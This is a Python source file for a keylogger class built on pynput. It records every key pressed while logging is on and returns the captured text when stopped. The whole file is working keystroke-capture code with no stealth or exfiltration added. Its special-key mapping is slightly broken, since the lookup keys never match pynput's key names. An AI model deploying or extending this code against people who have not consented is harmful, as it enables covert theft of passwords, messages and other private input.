import pynput.keyboard as keyboard


class KeyLogger:
    def __init__(self):
        self.keys = []
        self.is_logging = False
        self.listener = None

    def on_press(self, key):
        if not self.is_logging:  # Check if logging is enabled
            return

        try:
            self.keys.append(key.char)
        except AttributeError:
            special_keys = {'space': ' ', 'enter': '\n'}
            self.keys.append(f"[{special_keys.get(str(key), str(key))}]")

    def start_logging(self):
        if not self.is_logging:
            self.is_logging = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.is_logging = False
            if self.listener:
                self.listener.stop()
                self.listener.join()
            return "".join(self.keys)
